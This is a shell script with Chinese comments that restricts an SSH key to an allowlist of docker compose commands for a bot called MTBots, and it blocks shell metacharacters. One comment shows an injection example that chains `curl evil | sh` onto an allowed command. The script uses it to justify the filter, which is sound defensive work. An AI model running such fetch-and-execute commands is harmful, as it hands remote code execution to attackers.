#!/bin/sh
# MTBots 远端守卫：这把 ssh key 只允许跑 MTBots 会用到的那几条 docker 命令。
#
# 安装（远端主机，root）：
#   install -m 755 mtbots-compose-guard.sh /usr/local/bin/mtbots-compose-guard
#   # 然后在 /home/mtbots/.ssh/authorized_keys 那行前面加：
#   #   command="/usr/local/bin/mtbots-compose-guard",restrict
#
# 这里列的是 MTBots 会发出的**全部**命令形态（探测 / 扫描 / 升级 / 停止 / 状态 / 清理）。
# 以后 bot 侧新增命令，必须同步改这里，否则远端会以 126 拒绝，
# 面板上会显示「远端授权只允许 compose 操作（守卫脚本拒绝了这条命令）」。
set -eu

cmd=${SSH_ORIGINAL_COMMAND:-}

# 先整条否掉 shell 元字符：下面那些白名单模式都以 * 结尾（`"… stop"*`），
# 不拦的话 `docker compose -f x pull; curl evil | sh` 会被「放行」然后真的执行——
# bot 那边每条命令都经 shlex.join，正常路径里不会带这些字符；
# 万一你的项目路径里真有 $ & ; 之类，改个目录名，别给守卫开口子。
case "$cmd" in
  *';'* | *'&'* | *'|'* | *'$'* | *'`'* | *'\'* | *'>'* | *'<'* | *'
'*)
    echo "mtbots: command not allowed (shell metacharacter): $cmd" >&2
    exit 126
    ;;
esac

case "$cmd" in
  # ---- 探测与扫描 ----
  "docker compose version" | "docker compose ls"*)
    ;;
  "docker-compose version" | "docker-compose ls"*)
    ;;
  # ---- compose 操作（-f 后面是远端自己的路径；子命令限定为 pull / up -d / stop / config --services）----
  "docker compose -f "*" pull"* | "docker compose -f "*" up -d"* | "docker compose -f "*" stop"* | "docker compose -f "*" config --services"*)
    ;;
  "docker-compose -f "*" pull"* | "docker-compose -f "*" up -d"* | "docker-compose -f "*" stop"* | "docker-compose -f "*" config --services"*)
    ;;
  # ---- 只读查询（容器状态速览 + 清理候选扫描）----
  "docker ps"* | "docker image ls"* | "docker inspect --format "*)
    ;;
  # ---- 镜像清理 ----
  "docker image prune -f"*)
    ;;
  *)
    echo "mtbots: command not allowed: $cmd" >&2
    exit 126
    ;;
esac

exec sh -c "$cmd"
